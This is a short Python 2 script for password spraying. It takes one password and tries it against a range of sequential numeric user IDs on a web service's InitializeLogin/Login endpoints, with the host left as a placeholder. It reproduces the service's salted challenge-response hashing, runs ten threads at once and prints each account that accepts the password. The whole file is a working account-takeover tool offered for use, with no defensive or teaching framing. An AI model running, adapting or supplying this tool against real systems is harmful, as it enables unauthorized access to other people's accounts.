# Description
# Tries a given password on a range of userid's

# Parameters
# Parameter 1: Password to try
# Parameter 2: Starting range (int)
# Parameter 2: Ending range (int)


# Additional
# Replace [Host] with the host

import sys
import requests
import hashlib
import signal
import json
from collections import namedtuple
from os import system
import re
from multiprocessing.dummy import Pool

def signal_handler(signal, frame):
        print('Quiting')
        sys.exit(0)

def login(loginID, password, getCookie = False):
    #get challenge
    try:
        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)
    except:
        return login(loginID, password, getCookie)
    s = r.content
    s = s[s.index('{'):s.index('}') + 1]
    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))
    #hash password with challenge
    hash_dig = password
    try:
        for i in range(0, x.iterations):
            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()
        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()
    except:
        print "[!] Error on loginID",loginID
        return False

    try:
        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)
    except:
        return login(loginID, password, getCookie)

    if getCookie:
        return r.cookies
    return "true" in login.content

def progress(count, total, suffix):
    bar_len = 20
    filled_len = int(round(bar_len * count / float(total)))
    percents = round(100.0 * count / float(total), 1)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)
    print '[{0}] {1}% [{2}]\r'.format(bar, percents, suffix),

def loginThread(account):
    global accounts, found, i
    if login(account, passTry):
        print '[+] {0} with password {1} \n'.format(account, passTry),
        found = found + 1
    i = i + 1
    progress(i, len(accounts), found)

passTry = sys.argv[1]
found = 0
i = 1

accounts = range(int(sys.argv[2]), int(sys.argv[3]))
print "[*] Trying account id's between {0} and {1}, with password {2}".format(int(sys.argv[2]), int(sys.argv[3]), passTry)

signal.signal(signal.SIGINT, signal_handler)
pool = Pool(10)
asyncres = pool.map(loginThread, accounts)
pool.close()
pool.join()
